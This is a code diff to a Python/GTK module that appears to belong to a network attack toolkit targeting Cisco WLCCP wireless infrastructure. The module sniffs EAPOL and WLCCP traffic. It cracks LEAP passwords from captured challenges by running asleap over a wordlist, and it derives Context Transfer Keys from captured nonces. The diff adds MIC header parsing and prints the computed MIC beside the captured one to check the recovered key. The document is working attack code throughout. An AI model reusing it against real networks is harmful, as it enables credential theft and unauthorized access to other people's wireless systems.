@@ -30,6 +30,7 @@
 #       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 
 import hashlib
+import hmac
 import struct
 import socket
 import sys
@@ -39,14 +40,14 @@ import traceback
 
 import gobject
 import gtk
+import gtk.glade
 
 import dnet
 import dpkt
 
-from loki import asleap
-from loki import sha1
+import loki
 
-DEBUG = False
+DEBUG = True
 
 class wlccp_header(object):
     def __init__(self, version=None, sap=None, dst_type=None, msg_type=None, id=None, flags=None, orig_node_type=None, orig_node_mac=None, dst_node_type=None, dst_node_mac=None):
@@ -181,7 +182,7 @@ class mod_class(object):
         self.parent = parent
         self.platform = platform
         self.name = "wlccp"
-        self.gladefile = "modules/module_wlccp.glade"
+        self.gladefile = "/modules/module_wlccp.glade"
         self.hosts_liststore = gtk.ListStore(str, str, str)
         self.comms_treestore = gtk.TreeStore(str, str, str)
         self.dnet = None
@@ -196,7 +197,7 @@ class mod_class(object):
             self.election_thread.quit()
 
     def get_root(self):
-        self.glade_xml = gtk.glade.XML(self.gladefile)
+        self.glade_xml = gtk.glade.XML(self.parent.data_dir + self.gladefile)
         dic = { "on_crack_leap_button_clicked" : self.on_crack_leap_button_clicked,
                 "on_get_master_togglebutton_toggled" : self.on_get_master_togglebutton_toggled
                 }
@@ -322,7 +323,7 @@ class mod_class(object):
                     (iter, leap, leap_pw, nsk, nonces, ctk) = self.comms[host]
                 elif not host == "00:00:00:00:00:00":
                     iter = self.comms_treestore.append(None, ["%s\n       <=>\n%s" % (dnet.eth_ntoa(header.orig_node_mac), dnet.eth_ntoa(header.dst_node_mac)), "", host])
-                    self.comms[host] = (iter, (None, None, None, None), None, None, (None, None, None, None, None), None)
+                    self.comms[host] = (iter, (None, None, None, None), None, None, (None, None, None, None, None, (None, None)), None)
                 (eapol_version, eapol_type, eapol_len) = struct.unpack("!BBH", ret[2:6])
                 ret = ret[6:]
                 #check EAP-TYPE
@@ -391,30 +392,46 @@ class mod_class(object):
                 if header.msg_type & 0xc0 == 0x40:
                     #cmPathInit_Reply found
                     if host in self.comms:
-                        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter), ctk) = self.comms[host]
+                        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter, mic), ctk) = self.comms[host]
                         #skip WTLV_CM_PATH_INIT header
                         ret = ret[18:]
                         #skip WTLV_INIT_SESSION header
                         ret = ret[8:]
+                        (type, len) = struct.unpack("!HH", ret[:4])
+                        if not type == 0x10a or not len == 0x5a:
+                            if DEBUG:
+                                self.log("WLCCP: malformed WTLV_IN_SECURE_CONTEXT_REPLY header")
+                            return
                         #get nonces from WTLV_IN_SECURE_CONTEXT_REPLY header
                         counter = ret[4:8]
                         supp_node = ret[8:16]
                         dst_node = ret[16:24]
                         nonces = ret[24:56]
+                        #skip session timeout in WTLV_IN_SECURE_CONTEXT_REPLY header
+                        ret = ret[60:]
+                        #check for WTLV_MIC header
+                        (type, len) = struct.unpack("!HH", ret[:4])
+                        if not type == 0x108 or not len == 0x1e:
+                            if DEBUG:
+                                self.log("WLCCP: malformed WTLV_MIC header")
+                            return
+                        mic = ret[14:30]
+                        if DEBUG:
+                            self.log("WLCCP: found MIC %s" % mic.encode("hex"))
                         self.log("WLCCP: PATH-REPLY seen for %s" % host)
-                        self.comms[host] = (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonces, counter), ctk)
+                        self.comms[host] = (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonces, counter, (mic, udp.data)), ctk)
                 else:
                     #cmPathInit_Request found
                     if host in self.comms:
-                        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter), ctk) = self.comms[host]
+                        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter, mic), ctk) = self.comms[host]
                         #skip WTLV_CM_PATH_INIT header
                         ret = ret[18:]
                         #skip WTLV_INIT_SESSION header
                         ret = ret[8:]
                         #get nonces from WTLV_IN_SECURE_CONTEXT_REPLY header
-                        nonces = ret[24:56]
+                        nonces = ret[24:56]                            
                         self.log("WLCCP: PATH-REQUEST seen for %s" % host)
-                        self.comms[host] = (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonces, nonce_repl, counter), ctk)
+                        self.comms[host] = (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonces, nonce_repl, counter, mic), ctk)
         except:
             if DEBUG:
                 print '-'*60
@@ -443,7 +460,7 @@ class mod_class(object):
         if not host in self.comms:
             return None
 
-        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter), ctk) = self.comms[host]
+        (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter, (mic, packet)), ctk) = self.comms[host]
 
         ctk_seed = "\0%s%s%s%s%s\0" % (supp_node, dst_node, nonce_req, nonce_repl, counter)
         if len(nsk) != 16:
@@ -451,7 +468,15 @@ class mod_class(object):
         if len(ctk_seed) != 86:
             print "ctk_seed len incorrect"
         
-        return sha1.sha1_prf.sha1_prf(nsk, "SWAN IN to IA linkContext Transfer Key Derivation", ctk_seed, 32)
+        ctk = loki.sha1.sha1_prf.sha1_prf(nsk, "SWAN IN to IA linkContext Transfer Key Derivation", ctk_seed, 32)
+
+        mac = hmac.new(ctk)
+        tmp = packet[:-16]
+        mac.update(tmp)
+        print "given mic:  %s" % mic.encode("hex")
+        print "calced mic: %s" % mac.digest().encode("hex")
+
+        return ctk
 
     def on_crack_leap_button_clicked(self, btn):
         select = self.comms_treeview.get_selection()
@@ -468,7 +493,7 @@ class mod_class(object):
                 wl = self.wordlist_filechooserbutton.get_filename()
                 if not wl:
                     return
-                pw = asleap.asleap.attack_leap(wl, chall, leap_auth_resp, id, user)
+                pw = loki.asleap.asleap.attack_leap(wl, chall, leap_auth_resp, id, user)
                 if pw != "":
                     self.log("WLCCP: Found LEAP-Password %s for connection %s" % (pw, connection.replace('\n       <=>\n', ' <=> ')))
                     for i in xrange(self.comms_treestore.iter_n_children(iter)):
